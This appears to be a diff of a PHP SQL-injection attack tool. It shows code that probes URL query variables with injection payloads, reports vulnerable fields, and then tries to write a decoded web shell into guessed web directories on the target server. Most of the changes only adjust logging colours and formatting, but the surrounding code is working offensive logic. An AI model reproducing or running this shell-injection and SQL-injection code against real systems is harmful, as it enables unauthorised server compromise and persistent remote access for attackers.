@@ -58,15 +58,13 @@
 
 			public function isVulnerable(){
 
-				$url		=	$this->_httpAdapter->getUrl();
-				$vars		=	$url->getQueryAsArray();
-				$vars		=	$this->orderRequestVariables($vars);
-
-				$found	= FALSE;
-
-				$payloads = array(
-									"LIMIT 1,1",
-									"ORDER BY 1"
+				$url			=	$this->_httpAdapter->getUrl();
+				$vars			=	$url->getQueryAsArray();
+				$vars			=	$this->orderRequestVariables($vars);
+				$found		=	FALSE;
+				$payloads	=	array(
+												"LIMIT 1,1",
+												"ORDER BY 1"
 				);
 
 				$this->setUseConcat(TRUE);
@@ -91,7 +89,7 @@
 
 								$injection	=	$this->makeDiscoveryInjection();
 
-								$this->log("[$variable] Attempt:\t$i",0);
+								$this->log("[$variable] Attempt:\t$i",0,"white");
 
 								foreach($this->_fieldPayloads as $FPL){
 
@@ -109,7 +107,8 @@
 
 										$this->_isVulnerable	=	TRUE;
 
-										$this->log("FOUND SQL INJECTION!!!");
+										$this->log($this->_httpAdapter->getUrl(),0,"light_green",TRUE);
+										$this->log("FOUND SQL INJECTION!!!",0,"light_green",TRUE);
 										$this->log("Affected Variable:\t$variable");
 										$this->log("Affected Fields:\t".implode($matches,","));
 										$this->log("Field Count:\t$i");
@@ -636,7 +635,7 @@
 
 					if(!in_array($path,$webDirectories)){
 
-						$this->log("Adding crawler path information: $path",0,"light_green");
+						$this->log("Adding crawler path information: $path",0,"light_green",TRUE);
 						array_unshift($webDirectories,$path);
 
 					}
@@ -650,7 +649,7 @@
 
 				if(!sizeof($webDirectories)){
 
-					$this->log("Web defaults Plugin failed to get a valid directory for injecting a shell :(",2,"red");
+					$this->log("Web defaults Plugin failed to get a valid directory for injecting a shell :(",2,"red",TRUE);
 
 				}
 
@@ -681,6 +680,7 @@
 							$shellDirLocations[]	=	$unixDir.'/'.substr($host,strpos($host,'.')+1).'/'.$webDir.$fileName;
 						}
 
+
 						foreach($shellDirLocations as $shellDirLocation){
 
 							$this->log("Trying to inject shell in \"$shellDirLocation\"",0,"white");
@@ -697,7 +697,6 @@
 								if($result!==FALSE&&sizeof($result)){
 
 									if($result[0]==$decodedShell){
-										$this->log("LIKE A BOSS",0,"light_green");
 										return $shellWebLocation;
 									}
 
